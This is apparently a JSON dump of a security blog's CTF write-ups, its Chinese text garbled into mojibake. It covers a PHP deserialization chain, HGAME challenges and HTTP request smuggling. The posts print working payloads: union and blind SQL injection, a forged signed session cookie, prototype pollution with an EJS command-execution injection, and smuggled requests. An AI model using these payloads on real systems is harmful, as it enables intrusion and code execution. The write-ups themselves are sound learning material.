è¯»å–shell.php12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&#x27;shell.php&#x27;);class Game&#123; public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() &#123; $this-&gt;username=&#x27;user&#x27;; $this-&gt;password=&#x27;user&#x27;; &#125; public function __wakeup()&#123; if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123; $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); &#125;else&#123; $this-&gt;choice = new register(); &#125; &#125; public function __destruct() &#123; $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); &#125;&#125;class login&#123; public $file; public $filename; public $content; public function __construct($file,$filename,$content) &#123; $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; &#125; public function checking($username,$password) &#123; if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123; $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die(&#x27;login success you can to open shell file!&#x27;); &#125; &#125;&#125;class register&#123; public function checking($username,$password) &#123; if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123; die(&#x27;success register admin&#x27;); &#125;else&#123; die(&#x27;please register admin &#x27;); &#125; &#125;&#125;class Open&#123; function open($filename, $content)&#123; if(!file_get_contents(&#x27;waf.txt&#x27;))&#123; shell($content); &#125;else&#123; echo file_get_contents($filename.&quot;.php&quot;); &#125; &#125;&#125;if($_GET[&#x27;a&#x27;]!==$_GET[&#x27;b&#x27;]&amp;&amp;(md5($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;])) &amp;&amp; (sha1($_GET[&#x27;a&#x27;])=== sha1($_GET[&#x27;b&#x27;])))&#123; @unserialize(base64_decode($_POST[&#x27;unser&#x27;]));&#125; æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„æ˜¯è¯»å–æ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨åˆ°é¢˜ç›®ä¸­ç»™åˆ°çš„Openç±»ä¸­çš„openå‡½æ•°ï¼ŒæŸ¥çœ‹å“ªé‡Œä½¿ç”¨openå‡½æ•°ï¼Œè¯¥é¢˜æ€è·¯æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯ open-&gt;login-&gt;game è¿™ä¸‰ä¸ªç±» é¦–å…ˆç¬¬ä¸€æ­¥çš„ç»•è¿‡ç›´æ¥ç”¨æ•°ç»„ç»•è¿‡å³å¯ï¼Œè¿™ä¸ªç®€å•ï¼Œé‡ç‚¹æ˜¯ååºåˆ—åŒ–æˆ‘ä»¬ï¼ŒæŸ¥POPé“¾ï¼Œä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯ç»•è¿‡wakeupå‡½æ•°ï¼Œåæ¥å‘ç°æ²¡æ³•ç»•äº†ï¼ˆ7.0+ç‰ˆæœ¬å·²æ¶ˆé™¤äº†è¯¥é—®é¢˜ï¼‰ï¼Œæµªè´¹äº†è›®å¤šæ—¶é—´çš„ï¼Œä½†æ˜¯ä¹Ÿæ²¡å•¥å…³ç³»ï¼Œæˆ‘ä»¬ç›´æ¥èµ°wakeupå‡ºå‘ 12345678public function __wakeup()&#123; if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;// echo $this-&gt;content; $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); &#125;else&#123; $this-&gt;choice = new register(); &#125; &#125; çœ‹åˆ°è¿™é‡Œä¼šå…ˆçœ‹æˆ‘ä»¬çš„regiterçš„md5å€¼,md5ç¿»è¯‘å‡ºæ¥å°±æ˜¯adminï¼ŒæˆåŠŸçš„è¯å°±ä¼šè°ƒç”¨loginï¼Œå¤±è´¥äº†å°±ä¼šå»registerï¼Œä½†æ˜¯registeræ²¡å•¥ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¿è¯èƒ½è¿›å…¥loginå½“ä¸­ï¼Œæ•…ç¬¬ä¸€æ­¥çš„payloadï¼š 12$a=new Game();$a-&gt;register=&#x27;admin&#x27; æ¥ä¸‹æ¥çœ‹loginå‡½æ•°ï¼š 12345678910111213141516171819class login&#123; public $file; public $filename; public $content; public function __construct($file,$filename,$content) &#123; $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; &#125; public function checking($username,$password) &#123; if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123; $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die(&#x27;login success you can to open shell file!&#x27;); &#125; &#125;&#125; å‘ç°loginå‡½æ•°çš„checkingå‡½æ•°ä¼šå¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œæ£€æŸ¥ï¼Œæ£€æŸ¥è¿‡åå°±ä¼šè°ƒç”¨this-&gt;fileçš„openå‡½æ•°ï¼Œæ•…æˆ‘ä»¬éœ€è¦æ„å»ºï¼š 1234$a-&gt;username=&#x27;admin&#x27;;$a-&gt;password=&#x27;admin&#x27;;$c = new Open();$a-&gt;file = $c; å†çœ‹Openå‡½æ•°åšäº†ä»€ä¹ˆ 123456789class Open&#123; function open($filename, $content)&#123; if(!file_get_contents(&#x27;waf.txt&#x27;))&#123; shell($content); &#125;else&#123; echo file_get_contents($filename.&quot;.php&quot;); &#125; &#125;&#125; å‘ç°å½“æ²¡æœ‰waf.txtçš„æ—¶å€™ä¾¿ä¼šæ‰§è¡Œshellå‡½æ•°ï¼šä½†æ˜¯å½“å‰æˆ‘ä»¬ä¸çŸ¥é“shell.phpçš„ç”¨æ³•ï¼Œå¦‚æœæœ‰waf.txtåˆ™ä¼šè¯»å–æ–‡ä»¶ï¼Œç›®å‰æˆ‘ä»¬æ˜¯æœ‰waf.txtçš„ï¼Œæ‰€ä»¥å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œé‚£ä¹ˆæ¥ç€æ„é€ payload: 1$a-&gt;filename = &#x27;shell&#x27; è¿™æ ·å°±å¯ä»¥è¯»å–åˆ°æ–‡ä»¶shell.php 123456789101112&lt;?phpfunction shell($cmd)&#123; if(strlen($cmd)&lt;10)&#123; if(preg_match(&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/&#x27;,$cmd))&#123; die(&quot;NO&quot;); &#125;else&#123; return system($cmd); &#125; &#125;else&#123; die(&#x27;so long!&#x27;); &#125;&#125; åˆ°è¿™å°±å‚»çœ¼äº†ï¼Œè™½ç„¶è¿™ä¸ªç»•è¿‡ä¸éš¾ï¼Œä½†æ˜¯æˆ‘è¯¥æ€ä¹ˆè°ƒç”¨shellå‡½æ•°å‘¢ï¼Ÿè¿™æ—¶å†å›å¤´çœ‹ï¼Œå‘ç°openå‡½æ•°å¦‚æœæ²¡æœ‰æ‰¾åˆ°waf.txtçš„è¯å°±ä¼šè°ƒç”¨ã€‚ã€‚è¿™å°±å‚»çœ¼äº†ï¼Œè¿™æ€ä¹ˆå¯èƒ½å¯ä»¥ï¼Ÿ åˆ é™¤waf.txtè¿™æ—¶å€™å°±è¦é‡æ–°å›é¡¾é¢˜ç›®äº†ï¼Œé¢˜ç›®è°ƒç”¨åˆ°äº†openå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çŒœæƒ³openå‡½æ•°éš¾é“åªèƒ½ç”¨å½“å‰é¢˜ç›®çš„Openç±»å—ï¼Ÿæ˜¯ä¸æ˜¯æœ‰å…¶ä»–å†…ç½®ç±»ä¹Ÿæœ‰åŒåå‡½æ•°å‘¢ã€‚æ‰€ä»¥ä¸Šphpå®˜ç½‘å»æŸ¥æ‰¾äº†ä¸€ç•ªï¼Œæœç„¶æœ€ç»ˆæ‰¾åˆ° é‚£ä¹ˆè¿™æ ·å°±å¯ä»¥è§£å†³äº†ï¼Œæ„é€ payloadï¼š 123$a-&gt;file=new ZipArchive;$a-&gt;filename=&#x27;waf.txt&#x27;;$a-&gt;content = ZipArchive::OVERWRITE è¿™æ ·å°±å¯ä»¥åˆ é™¤æ‰æ–‡ä»¶ ç»•è¿‡è¿‡æ»¤è¿™ä¸ªå°±æ˜¯æœ€ç®€å•çš„ä¸€éƒ¨äº†ï¼Œç›´æ¥php /flag å³å¯ï¼Œæœ€ç»ˆpayloadï¼š 123456789101112131415161718$a&#x3D;new Game();$a-&gt;username&#x3D;&#39;admin&#39;;$a-&gt;password&#x3D;&#39;admin&#39;;$c&#x3D;new Open();$a-&gt;file&#x3D;$c;&#x2F;&#x2F;$c&#x3D;new Open();&#x2F;&#x2F;$a-&gt;file&#x3D;new ZipArchive;&#x2F;&#x2F;$a-&gt;content&#x3D;&#39;php &#x2F;flag&#39;;&#x2F;&#x2F;$a-&gt;content&#x3D;ZipArchive::OVERWRITE;&#x2F;&#x2F;$a-&gt;content&#x3D;&#39;php &#x2F;flag&#39;;$a-&gt;content&#x3D;&#39;php &#x2F;flag&#39;;$a-&gt;filename&#x3D;&quot;waf.txt&quot;;$s&#x3D; (serialize($a));echo base64_encode($s);unserialize($s); æ€»ç»“ï¼š æ„Ÿè§‰è¿™é¢˜ç›®çš„æ€è·¯æŒºå¥½çš„ï¼Œåˆ©ç”¨åˆ°äº†å†…ç½®ç±»çš„çŸ¥è¯†ï¼Œç›¸å½“æœ‰è¶£~ï¼ˆè™½ç„¶åšçš„æ—¶å€™å‘—ç»•æ¥ç»•å»","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"nodejså­¦ä¹ ç¬”è®°","slug":"nodejså­¦ä¹ ç¬”è®°","date":"2021-03-01T06:43:16.000Z","updated":"2021-03-01T07:04:30.595Z","comments":true,"path":"2021/03/01/nodejså­¦ä¹ ç¬”è®°/","link":"","permalink":"http://example.com/2021/03/01/nodejs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"nodejsç°åœ¨nodejsæ¥è¿›è¡Œrceçš„é¢˜ç›®è¶Šæ¥è¶Šå¤šäº†ï¼Œï¼Œå¿…é¡»å¾—å­¦ä¹ ä¸€æ³¢äº†ï¼Œè¿™é‡Œå¼€å§‹å­¦ä¹  requireå’Œexportåœ¨nodejså½“ä¸­ï¼Œexportç”¨äºå»ºç«‹æ–‡ä»¶çš„å¯¹å¤–æ¥å£ï¼Œä½ å¯ä»¥ç†è§£ä¸ºåœ¨nodejså½“ä¸­çš„å•ä¸ªæ–‡ä»¶éƒ½æ˜¯å°é—­çŠ¶æ€ï¼Œå¦‚æœä¸ç”¨exportæ¥å®šä¹‰å¯¹å¤–çš„æ¥å£ï¼Œå…¶ä»–æ–‡ä»¶æ˜¯æ— æ³•è¿›è¡Œimportæ“ä½œçš„ require ä¸ importçš„åŒºåˆ«å³æ˜¯requireè¿è¡Œç”¨æˆ·åŠ¨æ€çš„æ¥è·å–éœ€è¦çš„åŒ… æ–‡ä»¶æ“ä½œNode.js å¯¹ä¼ ç»Ÿçš„ js æœ€å¤§çš„å‡çº§å°±æ˜¯æ”¯æŒäº†æ–‡ä»¶æ“ä½œå’Œç½‘ç»œç¼–ç¨‹ã€‚å†…ç½®çš„ fs æ¨¡å—å¯¹æ–‡ä»¶è¯»å†™æä¾›äº†å¼ºå¤§çš„æ”¯æŒï¼Œä¸ä»…æ”¯æŒä¼ ç»Ÿçš„åŒæ­¥æ–‡ä»¶è¯»å†™ï¼Œè¿˜æ”¯æŒé¢‡å…· js ç‰¹è‰²çš„å¼‚æ­¥æ–‡ä»¶è¯»å†™ã€‚","categories":[],"tags":[{"name":"nodejs","slug":"nodejs","permalink":"http://example.com/tags/nodejs/"},{"name":"åŸå‹é“¾æ±¡æŸ“","slug":"åŸå‹é“¾æ±¡æŸ“","permalink":"http://example.com/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"}]},{"title":"hgame","slug":"hgame","date":"2021-02-24T03:19:28.000Z","updated":"2021-03-01T04:19:58.638Z","comments":true,"path":"2021/02/24/hgame/","link":"","permalink":"http://example.com/2021/02/24/hgame/","excerpt":"","text":"Hgame é¢˜ç›®å‡ºå¾—éƒ½æŒºå¥½çš„.. week1Hitchhiking_in_the_Galaxyå„ç§æŠ“åŒ…å°±å¥½äº† ç®€å•ä¸”ä¸Šå¤´çš„æ¸¸æˆJSé‡Œé¢å¯ä»¥æ‰¾åˆ°ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥é€šè¿‡æ”¹åˆ†è¾¨ç‡çœŸçš„ç©æ¸¸æˆ å®è—èµ°ç§è€…HTTPèµ°ç§ï¼Œå·²ç»å†™è¿‡äº† æ™ºå•†æ£€æµ‹é¸¡ä¸€ä¸ªè„šæœ¬é¢˜ç›® 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import requestsfrom sympy import *import reimport jsonimport timefrom bs4 import BeautifulSoupfrom requests.cookies import RequestsCookieJar# import json# å¾—åˆ°é—®é¢˜def getQuestion(content): soup=BeautifulSoup(content,&#x27;html.parser&#x27;) #print soup.prettify() a=soup.find_all(&#x27;mo&#x27;) b=soup.find_all(&#x27;mi&#x27;) c=soup.find_all(&#x27;mn&#x27;) sx=a[1].string+c[0].string xx=c[1].string sc=c[2].string+&quot;*&quot;+b[0].string+a[3].string+c[3].string print(&quot;sc=&#123;&#125;,sx=&#123;&#125;,xx=&#123;&#125;&quot;.format(sc,sx,xx)) # print(sx+&quot;:&quot;+xx+&quot;:&quot;+sc) x=symbols(&#x27;x&#x27;) answer=float(integrate(sc,(&#x27;x&#x27;,sx,xx))) # print(answer) return answer# print(res)# &#123;&quot;answer&quot;:-42927&#125;# &#123;&quot;answer&quot;:&quot;-42927&quot;&#125;# å›ç­”é—®é¢˜def verify(answer,cookies): verify = &quot;http://r4u.top:5000/api/verify&quot; headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;,&#x27;Cookie&#x27;:&#x27;session=&#123;&#125;&#x27;.format(cookies)&#125; data = &#123;&quot;answer&quot;: &quot;&#123;&#125;&quot;.format(answer)&#125; res2 = requests.post(verify, data=json.dumps(data),headers=headers) cookies = res2.cookies[&#x27;session&#x27;] return cookies# print(integrate(18 * x + 18, (&#x27;x&#x27;, -68, 83)))# å…ˆè¿›è¡Œé¡¶ä¸€æ¬¡è®¿é—®æ‹¿åˆ°cookiescookies = verify(1,&quot;sss&quot;)for i in range(1,101): # print(answer) Question = &quot;http://r4u.top:5000/api/getQuestion&quot; print(cookies) header = &#123;&#x27;Cookie&#x27;:&#x27;session=&#123;&#125;&#x27;.format(cookies)&#125; res = requests.get(Question,headers=header) content = res.text # å¾—åˆ°ç­”æ¡ˆ answer = getQuestion(content) verify = &quot;http://r4u.top:5000/api/verify&quot; headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;,&#x27;Cookie&#x27;:&#x27;session=&#123;&#125;&#x27;.format(cookies)&#125; data = &#123;&quot;answer&quot;: &quot;&#123;&#125;&quot;.format(answer)&#125; res2 = requests.post(verify, data=json.dumps(data),headers=headers) print(res2.text) cookies = res2.cookies[&#x27;session&#x27;] print(cookies) print(answer) week2æ‡’ç‹—R4uå¯ä»¥æ‹¿ä¸‹æºç www.zip 123456789101112$filter = [&quot;SESSION&quot;, &quot;SEVER&quot;, &quot;COOKIE&quot;, &quot;GLOBALS&quot;];// ç›´æ¥æ³¨å†Œæ‰€æœ‰å˜é‡ï¼Œè¿™æ ·æˆ‘å°±èƒ½å°‘æ‰“å­—åŠ›ï¼ŒèŠœæ¹–~foreach(array(&#x27;_GET&#x27;,&#x27;_POST&#x27;) as $_request)&#123; foreach ($$_request as $_k =&gt; $_v)&#123; foreach ($filter as $youBadBad)&#123; $_k = str_replace($youBadBad, &#x27;&#x27;, $_k); &#125; $&#123;$_k&#125; = $_v; &#125;&#125; å¾ˆç»å…¸çš„å˜é‡è¦†ç›–äº†ï¼Œè¿‡æ»¤åªä¸è¿‡æ˜¯å˜ç©ºï¼Œè¿™æ ·å­æ„é€ Payload ?_SSSSESIONESION[username]=admin å³å¯ 200OKï¼ä¸€é“ç®€å•çš„æ³¨å…¥é¢˜ç›®ï¼Œåšçš„æ—¶å€™æƒ³å¤æ‚äº†ï¼Œåæ¥æ‰æ„è¯†åˆ°é‚£ä¹ˆç®€å• 12345678910111213141516171819202122232425262728293031323334import requests,sysurl = &quot;https://200ok.liki.link/server.php&quot;# headers =&#123;&quot;Status&quot;:&quot;-1&#x27;/**/Union/**/Select/**/database() #&quot;&#125;headers =&#123;&quot;Status&quot;:&quot;-1&#x27;/**/Union/**/Select/**/group_concat(table_name)/**/From(information_schema.tables)/**/Where(table_schema=&#x27;week2sqli&#x27;) #&quot;&#125;headers =&#123;&quot;Status&quot;:&quot;-1&#x27;/**/Union/**/Select/**/group_concat(column_name)/**/From(information_schema.columns)/**/Where(table_schema=&#x27;week2sqli&#x27;) #&quot;&#125;headers =&#123;&quot;Status&quot;:&quot;-1&#x27;/**/Union/**/Select/**/ffffff14gggggg/**/From/**/f1111111144444444444g #&quot;&#125;res = requests.get(url, headers=headers).textprint(res)# flag = &quot;&quot;# for i in range(1, 999):# # for j in stringlist:# for j in range(40, 126):# # sql = &quot;1=(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j)# # sql = &quot;1=(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j)# # sql = &quot;1=(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(# # i, j)# sql = &quot;1&#x27;||if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0) #&quot;.format(i,j)# sql = &quot;1&#x27;||if(ascii(substr(select(group_concat(table_name)from(information_schema.tables) where(table_schema)=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0) #&quot;.format(i,j)# headers = &#123;&quot;Status&quot;: sql&#125;# res = requests.get(url=url, headers=headers)# # print(data)# if &quot;NETWORK ERROR&quot; in res.text:# print(j)# flag += chr(j)# print(flag)# break# if i == 30:# sys.exit()# database: week2sql week3Arknightsåœ¨gitæ³„éœ² å¯ä»¥ä¸‹è½½å‡ºæºç ï¼Œ å¾ˆç®€å•çš„å°±å¯ä»¥æ‰¾åˆ°ï¼š 12345678910class Eeeeeeevallllllll&#123; public $msg=&quot;åålikiåˆ°æ­¤ä¸€æ¸¸&quot;; public function __destruct() &#123; echo $this-&gt;msg; &#125;&#125; æ¥ä¸‹æ¥å°±å»æ‰¾toStringï¼Œä¹Ÿå¾ˆç®€å•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class CardsPool&#123; public $cards; private $file = &#x27;1.txt&#x27;; public function __construct($file) &#123; $this-&gt;file=$file; &#125; public function draw() &#123; $rand = mt_rand(1, 100); $level = 0; if ($rand &gt;= 1 &amp;&amp; $rand &lt;= 42) &#123; $level = 3; &#125; elseif ($rand &gt;= 43 &amp;&amp; $rand &lt;= 90) &#123; $level = 4; &#125; elseif ($rand &gt;= 91 &amp;&amp; $rand &lt;= 99) &#123; $level = 5; &#125; elseif ($rand == 100) &#123; $level = 6; &#125; $rand_key = array_rand($this-&gt;cards[$level]); return array( &quot;stars&quot; =&gt; $level, &quot;No&quot; =&gt; $rand_key, &quot;card&quot; =&gt; $this-&gt;cards[$level][$rand_key] ); &#125; public function init() &#123; $this-&gt;cards = include($this-&gt;file); &#125; public function __toString()&#123; return file_get_contents($this-&gt;file); &#125;&#125; ç„¶åå°±æ‰¾ä¸ªèƒ½è§¦å‘ååºåˆ—åŒ–çš„åœ°æ–¹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445class Session&#123; private $sessionData; const SECRET_KEY = &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;; public function __construct()&#123;&#125; public function set($key, $value)&#123; if(empty($key))&#123; $this-&gt;sessionData[] = $value; &#125;else&#123; $this-&gt;sessionData[$key] = $value; &#125; &#125; public function getAll()&#123; return $this-&gt;sessionData; &#125; public function save()&#123; $serialized = serialize($this-&gt;sessionData); $sign = base64_encode(md5($serialized . self::SECRET_KEY)); $value = base64_encode($serialized) . &quot;.&quot; . $sign; setcookie(&quot;session&quot;,$value); &#125; public function extract($session)&#123; $sess_array = explode(&quot;.&quot;, $session); $data = base64_decode($sess_array[0]); $sign = base64_decode($sess_array[1]); if($sign === md5($data . self::SECRET_KEY))&#123; $this-&gt;sessionData = unserialize($data); &#125;else&#123; unset($this-&gt;sessionData); die(&quot;Go away! You hacker!&quot;); &#125; &#125;&#125; æ­£å¥½å°±æœ‰ï¼Œåªéœ€è¦æˆ‘ä»¬çš„sessionç¬¦åˆä»–çš„è§„åˆ™å°±å¯ä»¥æ„é€ ååºåˆ—åŒ–äº†ï¼Œé‚£ä¹ˆæ„é€ Payloadï¼š 1234567891011$Eval = new Eeeeeeevallllllll();$card = new CardsPool(&#x27;./flag.php&#x27;);const SECRET_KEY= &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;;$Eval-&gt;msg=$card;$serialized = serialize($Eval);$sign = base64_encode(md5($serialized . SECRET_KEY));$value = base64_encode($serialized) . &quot;.&quot; . $sign;echo $value; è¿™æ ·å¾—åˆ°ç­”æ¡ˆ 1TzoxNzoiRWVlZWVlZXZhbGxsbGxsbGwiOjE6e3M6MzoibXNnIjtPOjk6IkNhcmRzUG9vbCI6Mjp7czo1OiJjYXJkcyI7TjtzOjE1OiIAQ2FyZHNQb29sAGZpbGUiO3M6MTA6Ii4vZmxhZy5waHAiO319.ZjgzNzJjMDVlNTI3MGRlZTRiYjg4NDQxNWNhZGZiNDA= ForgetfulSSTIçš„é¢˜ç›®ï¼Œå‡ ä¹æ²¡æœ‰è¿‡æ»¤ï¼Œç›´æ¥æ‹¿ä¸‹ï¼Œå‚è€ƒæˆ‘ä»¥å‰çš„æ–‡ç« payloadå¯ä»¥ç›´æ¥æ‰“é€š week4æ¼«æ— æ­¢å¢ƒçš„æ˜ŸæœŸæ—¥JSåŸå‹é“¾æ±¡æŸ“+ejsçš„æ¨¡æ¿æ³¨å…¥ åœ¨static/www.zip ä¸‹é¢å¯ä»¥æ‹¿åˆ°æºç ï¼š é‡ç‚¹ä»£ç åœ¨è¿™é‡Œï¼š 12345678910111213app.all(&#x27;/wish&#x27;, (req, res) =&gt; &#123; if (!req.session.crying) &#123; return res.send(&quot;forbidden.&quot;) &#125; if (req.method == &#x27;POST&#x27;) &#123; let wishes = req.body.wishes req.session.wishes = ejs.render(`&lt;div class=&quot;wishes&quot;&gt;$&#123;wishes&#125;&lt;/div&gt;`) return res.redirect(302, &#x27;/show&#x27;); &#125; return res.render(&#x27;wish&#x27;);&#125;) è¿™é‡Œå¯ä»¥é€šè¿‡æ¨¡æ¿æ³¨å…¥ï¼Œä½†æ˜¯å¿…é¡»å®Œæˆå‰ç½®æ¡ä»¶ï¼Œå¾—åˆ°session.cryingï¼Œæ‰€ä»¥å¾€å‰æ‰¾ ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920app.all(&#x27;/&#x27;, (req, res) =&gt; &#123; let data = &#123; name: &quot;&quot;, discription: &quot;&quot; &#125; if (req.ip === &quot;::ffff:127.0.0.1&quot;) &#123; data.crying = true &#125; if (req.method == &#x27;POST&#x27;) &#123; Object.keys(req.body).forEach((key) =&gt; &#123; if (key !== &quot;crying&quot;) &#123; data[key] = req.body[key] &#125; &#125;) req.session.crying = data.crying req.session.name = data.name req.session.discription = data.discription return res.redirect(302, &#x27;/show&#x27;); &#125; return res.render(&#x27;loop&#x27;)&#125;) æ ¸å¿ƒä»£ç å°±æ˜¯åœ¨ä»–å¾ªç¯éå†è¿™ä¸€æ®µï¼Œä¼šå°†cryingè¿›è¡Œä¸€æ¬¡è®¾ç½®ï¼Œç›´æ¥åŸå‹é“¾æ±¡æŸ“ï¼š 1&#123; &quot;name&quot;: &quot;123&quot;,&quot;discription&quot;:&quot;123&quot;,&quot;__proto__&quot;:&#123;&quot;crying&quot;:&quot;123&quot;&#125;&#125; è¿™æ ·å­å°±å¯ä»¥å–åˆ°sessionï¼Œejsæ¨¡æ¿æ³¨å…¥çš„éƒ¨åˆ†çœ‹å®˜æ–¹æ–‡æ¡£å³å¯ï¼š = =å‘ç°ä»–å°±ç›´æ¥æ‰§è¡Œä»£ç çš„ï¼Œé‚£ä¹ˆå¾ˆç®€å•çš„ 1wishes=&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;) %&gt;","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]},{"title":"httpèµ°ç§","slug":"httpèµ°ç§","date":"2021-02-07T06:25:34.000Z","updated":"2021-02-07T08:19:33.885Z","comments":true,"path":"2021/02/07/httpèµ°ç§/","link":"","permalink":"http://example.com/2021/02/07/http%E8%B5%B0%E7%A7%81/","excerpt":"","text":"ä¹Ÿæ˜¯åœ¨Hgameé‡Œé¢é‡è§äº†æ‰å­¦ä¹ åˆ°ï¼Œhttpèµ°ç§äº§ç”Ÿçš„åŸå› å¾ˆç®€å•ï¼Œå°±æ˜¯å› ä¸ºHTTPåè®®æä¾›ä¸¤ç§æ–¹å¼æ¥å†³å®šç»“æŸçš„æ–¹å¼ï¼Œåˆ†åˆ«æœ‰ Content-Lengthæ ‡å¤´å’ŒTransfer-Encodingæ ‡å¤´ï¼ŒContent-Lenthæˆ‘ä»¬ä¸€èˆ¬è§å¾—å¤šï¼Œå®ƒä»¥å­—èŠ‚ä¸ºå•ä½æŒ‡å®šæ¶ˆæ¯å†…å®¹ä½“çš„é•¿åº¦ï¼Œä¾‹å¦‚ï¼š 12345678POST / HTTP/1.1Host: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Cookie: session=5n2xRNXtAYM9teOEn3jSkEDDabLe0Qv8Content-Length: 35a=11 Transfer-Encodingæ ‡å¤´ç”¨äºæŒ‡å®šæ¶ˆæ¯ä½“ä½¿ç”¨åˆ†å—ç¼–ç ï¼ˆChunked Encodeï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´æ¶ˆæ¯æŠ¥æ–‡ç”±ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®å—ç»„æˆï¼Œæ¯ä¸ªæ•°æ®å—å¤§å°ä»¥å­—èŠ‚ä¸ºå•ä½ï¼ˆåå…­è¿›åˆ¶è¡¨ç¤ºï¼‰ è¡¡é‡ï¼Œåè·Ÿæ¢è¡Œç¬¦ï¼Œç„¶åæ˜¯å—å†…å®¹ï¼Œæœ€é‡è¦çš„æ˜¯ï¼šæ•´ä¸ªæ¶ˆæ¯ä½“ä»¥å¤§å°ä¸º0çš„å—ç»“æŸï¼Œä¹Ÿå°±æ˜¯è¯´è§£æé‡åˆ°0æ•°æ®å—å°±ç»“æŸã€‚å¦‚ï¼š 123456789POST / HTTP/1.1Host: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.netContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedba=110 å…¶å®ç†è§£èµ·æ¥æ¼æ´çœŸçš„å¾ˆç®€å•ï¼Œå°±æ˜¯å‰åç«¯å¯¹äºHTTPç»“æŸçš„è§„å®šä¸åŒï¼Œæ¯”å¦‚å‰ç«¯å¯èƒ½è¯»å–åˆ°Content-Lengthå°±è®¤ä¸ºè¿™æ®µè¯·æ±‚ç»“æŸäº†ï¼Œè€Œæ•´ä¸ªè¯·æ±‚åŒ…è¢«å‘é€è¿‡å»çš„æ—¶å€™åç«¯è¯»å–åˆ°äº†Transfer-Encodingï¼Œè®¤ä¸ºåˆ°è¿™ç»“æŸï¼Œæ‰€ä»¥ä¸¤è€…å°±å¤„ç†ä¸åŒäº†ã€‚ é‚£ä¹ˆå°±å¯èƒ½äº§ç”Ÿå¦‚ä¸‹å‡ ç§ä¸åŒæƒ…å†µï¼š å‰ç«¯å¤„ç†Content-Length,åç«¯ä¸å¤„ç†1234567GET / HTTP/1.1Host: police.liki.linkContent-Length: 77GET /secret HTTP/1.1Host: police.liki.linkClient-IP:127.0.0.1 åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‰ç«¯å¤„ç†åˆ°Content-Lenthä¹‹åå°±ä¼šåœä¸‹ï¼Œä½†æ˜¯åç«¯å¹¶ä¸ä¼šï¼Œç»§ç»­å¤„ç†ååŠæ®µçš„è¯·æ±‚ã€‚ å‰åç«¯å¤„ç†CLæ–¹å¼ä¸åŒå½“è¯·æ±‚ä¸­å‡ºç°ä¸¤ä¸ªCLçš„æ—¶å€™ï¼Œå‰åç«¯çš„å¤„ç†æ–¹å¼ä¸åŒä¹Ÿä¼šå¯¼è‡´æ¼æ´è¯ç”Ÿï¼Œä¾‹å­ï¼š 12345678POST / HTTP/1.1Host: police.liki.linkContent-Length: 89Content-Length: 90(ä¸­é—´ç•¥è¿‡)12345678 